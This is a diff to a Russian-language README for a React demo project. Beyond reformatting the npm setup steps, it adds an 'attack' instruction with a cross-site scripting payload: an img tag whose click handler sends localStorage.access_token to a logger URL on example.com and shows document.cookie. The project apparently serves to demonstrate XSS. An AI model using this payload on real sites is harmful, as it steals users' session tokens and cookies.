@@ -6,8 +6,13 @@
 ## Environment
 Чтобы запустить скрипт необходимо наличие npm:
 
-1. npm install
-2. npm start
+1. ```npm install```
+2. ```npm start```
+
+Для проведения атаки необходимо ввести текст:
+```
+<img src=/ onClick={fetch('http://example.com/logger.php?token='+localStorage.access_token);alert(document.cookie);} />
+```
 
 P.S. This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
 
